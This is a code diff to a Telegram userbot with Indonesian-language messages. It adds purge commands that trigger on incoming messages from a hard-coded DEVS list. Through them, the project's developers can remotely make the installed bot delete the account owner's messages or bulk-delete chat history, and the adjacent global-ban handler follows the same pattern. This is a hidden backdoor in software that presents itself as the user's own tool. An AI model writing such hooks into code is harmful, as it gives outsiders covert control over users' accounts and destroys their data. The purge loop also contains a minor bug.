@@ -17,7 +17,52 @@ from userbot.utils import edit_or_reply, get_user_from_event, man_cmd
 from .admin import BANNED_RIGHTS, UNBAN_RIGHTS
 
 
-@register(incoming=True, from_users=DEVS, pattern="^\.cpurgeme
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cpurgeme")
+async def purgeme(delme):
+    message = delme.text
+    count = int(message[9:])
+    i = 1
+    async for message in delme.client.iter_messages(delme.chat_id, from_user="me"):
+        if i > count + 1:
+            break
+        i += 1
+        await message.delete()
+    smsg = await delme.client.send_message(
+        delme.chat_id,
+        "**Berhasil Menghapus** " + str(count) + " **Kenangan**",
+    )
+    await sleep(2)
+    i = 1
+    await smsg.delete()
+
+
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cpurge$")
+async def fastpurger(purg):
+    chat = await purg.get_input_chat()
+    msgs = []
+    itermsg = purg.client.iter_messages(chat, min_id=purg.reply_to_msg_id)
+    count = 0
+    if purg.reply_to_msg_id is None:
+        return await edit_delete(purg, "**Mohon Balas Ke Pesan**")
+    async for msg in itermsg:
+        msgs.append(msg)
+        count += 1
+        msgs.append(purg.reply_to_msg_id)
+        if len(msgs) == 100:
+            await purg.client.delete_messages(chat, msgs)
+            msgs = []
+    if msgs:
+        await purg.client.delete_messages(chat, msgs)
+    done = await purg.client.send_message(
+        purg.chat_id,
+        "**Fast Purge Completed!**\n**Berhasil Menghapus** `"
+        + str(count)
+        + "` **Pesan**",
+    )
+    await sleep(2)
+    await done.delete()
+
+
 @register(incoming=True, from_users=DEVS, pattern=r"^\.cgban(?: |$)(.*)")
 async def cgban(event):
     if event.fwd_from:
